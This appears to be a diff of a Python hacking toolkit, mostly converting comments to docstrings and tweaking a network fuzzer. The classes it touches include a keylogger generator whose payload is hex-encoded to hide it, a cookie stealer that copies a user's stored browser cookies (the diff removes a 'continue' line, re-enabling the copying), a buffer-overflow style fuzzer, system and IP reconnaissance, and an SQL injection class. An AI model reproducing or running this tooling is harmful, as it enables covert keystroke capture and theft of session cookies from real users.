@@ -8,16 +8,18 @@ from platform import *
 from shutil import copy
 from bs4 import BeautifulSoup
 
+
 class ArgParser(ArgumentParser):
-    # Program Usage. Returns arguments being passed
+    '''Program Usage. Returns arguments being passed'''
     def add_option(self, option1, option2, descr=''):
         self.add_argument(option1, option2, help=descr)
 
     def parse(self):
         return self.parse_args()
 
+
 class Seeker(object):
-    # loops  files given path and matches a particular string.
+    '''loops  files given path and matches a particular string.'''
     def __init__(self):
         self.count = []
 
@@ -38,8 +40,9 @@ class Seeker(object):
                     print(os.path.join(path, file))
                     self.count.append(file)
 
+
 class System(object):
-    # Attempts To Find System Hardware, Hostname and Operating System.
+    '''Attempts To Find System Hardware, Hostname and Operating System.'''
     def __init__(self):
         self.platform = platform()
         self.architecture = architecture()[0]
@@ -57,8 +60,9 @@ class System(object):
         # Output The Result
         return self.platform, self.architecture, self.hostname, self.processor
 
+
 class Ip(object):
-    # Fetches ip using http://checkip.dyndns.org
+    '''Fetches ip using http://checkip.dyndns.org'''
     def __init__(self):
         self.url = 'http://checkip.dyndns.org'
 
@@ -74,8 +78,9 @@ class Ip(object):
         ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
         return ip
 
+
 class Keylogger(object):
-    # Generates a keylogger script
+    '''Generates a keylogger script'''
     def __init__(self):
         self.code = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d"
         self.code += "\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68"
@@ -137,8 +142,9 @@ class Keylogger(object):
             source.write(self.code)
             source.close()
 
+
 class Scrape(object):
-    # Fecthes a Specific page and finds links
+    '''Fecthes a Specific page and finds links'''
     def __init__(self, page):
         self.page = requests.get(page)
         self.content = self.page.content
@@ -158,8 +164,9 @@ class Scrape(object):
         for link in self.href_parser.findAll('a'):
             print(link.get('href'))
 
+
 class Cookiemonster(object):
-    # Fetches locally stored cookies
+    '''Fetches locally stored cookies'''
     def __init__(self):
         self.files = []
         self.user = os.environ.get('USERNAME')
@@ -206,15 +213,15 @@ class Cookiemonster(object):
         if not os.path.exists(cookiejar):
             os.mkdir(dirame)
             for paths in self.cookie_paths:
-                continue
                 for file in os.listdir(paths):
                     try:
                         copy(os.path.join(paths, file), cookiejar)
                     except Exception as e:
                         pass
 
+
 class NetFuzzer(object):
-    # Fuzzer For Network Services
+    '''Fuzzer For Network Services'''
     def __init__(self, host, port):
         self.sock = socket()
         self.host = host
@@ -235,21 +242,24 @@ class NetFuzzer(object):
         return self.buffer
 
     def fuzz(self, recvsize):
-        self.sock.settimeout(5)
+        self.sock.settimeout(10)
         self.sock.connect((self.host, self.port))
-        self.sock.send("USER " + self.buffer.encode() + "\r\n")
-        while True:
-            return self.sock.recv(recvsize)
+        self.sock.recv(recvsize)
+        self.sock.send(self.buffer.encode())
+        self.sock.recv(recvsize)
+        return self.sock.recv(recvsize)
+
 
     def status(self):
         service = socket()
         service.connect((self.host, self.port))
-        if service.recv(1024):
+        if service.recv(4096):
             return True
         return False
 
+
 class SQLInject(object):
-    # SQL Injection
+    'SQL Injection'
     def __init__(self, url):
         self.errors = []
         self.url = url
